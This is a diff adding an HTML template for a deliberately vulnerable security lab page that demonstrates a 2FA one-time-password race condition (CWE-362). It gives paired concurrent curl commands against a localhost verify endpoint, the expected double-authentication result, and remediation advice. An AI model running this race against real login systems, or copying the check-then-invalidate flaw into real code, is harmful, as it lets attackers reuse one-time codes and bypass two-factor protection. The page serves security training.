@@ -1,0 +1,48 @@
+{% extends 'base.html' %}
+{% block title %}2FA TOCTOU Race Condition{% endblock %}
+{% block content %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p1">P1</span>
+    <h2>2FA TOCTOU Race Condition</h2>
+    <p class="mono-dim">CWE-362 · Check-then-act gap · Two concurrent requests with same OTP both succeed</p>
+  </div>
+  <div class="vuln-info">
+    The verify endpoint checks <code>valid == True</code>, sleeps 50ms (processing simulation),
+    then sets <code>valid = False</code>. Two concurrent requests pass the check before either
+    completes the invalidation — both get authenticated with the same OTP.
+    <br><b>Distinct from</b> the existing 2FA bypass (<code>/auth/verify-otp</code>) which exploits
+    no-rate-limit + globally stored OTP. This is a TOCTOU race on the invalidation step itself.
+  </div>
+
+  {% if otp %}
+  <div class="vuln-info" style="border-color:#2ecc71">
+    <b>OTP Issued:</b> <code style="font-size:1.4rem;letter-spacing:.2em">{{ otp }}</code>
+    <br>Now fire two concurrent requests to <code>POST /auth/2fa-v2/verify</code> with body
+    <code>{"otp":"{{ otp }}"}</code> before the 50ms window closes.
+  </div>
+  {% endif %}
+
+  <form method="POST" class="lab-form">
+    <button type="submit" class="btn">Issue OTP (Step 1)</button>
+  </form>
+
+  <div class="hint-box">
+    <b>Step 2 — Race with curl (run both simultaneously):</b>
+    <pre class="result-block">{% if otp %}OTP="{{ otp }}"{% else %}OTP="&lt;paste OTP from above&gt;"{% endif %}
+curl -s -X POST http://localhost:5000/auth/2fa-v2/verify \
+     -H "Content-Type: application/json" \
+     -H "Cookie: session=&lt;your-session-cookie&gt;" \
+     -d "{\"otp\":\"$OTP\"}" &amp;
+curl -s -X POST http://localhost:5000/auth/2fa-v2/verify \
+     -H "Content-Type: application/json" \
+     -H "Cookie: session=&lt;your-session-cookie&gt;" \
+     -d "{\"otp\":\"$OTP\"}" &amp;
+wait</pre>
+    <b>Expected result:</b> Both responses show <code>"authenticated": true</code> and
+    <code>"otp_use_count": 2</code>, proving the race was won.
+    <br><b>Remediation:</b> Wrap check + invalidate in a mutex, or use an atomic
+    <code>UPDATE ... WHERE valid=1</code> in the DB (optimistic lock).
+  </div>
+</div>
+{% endblock %}
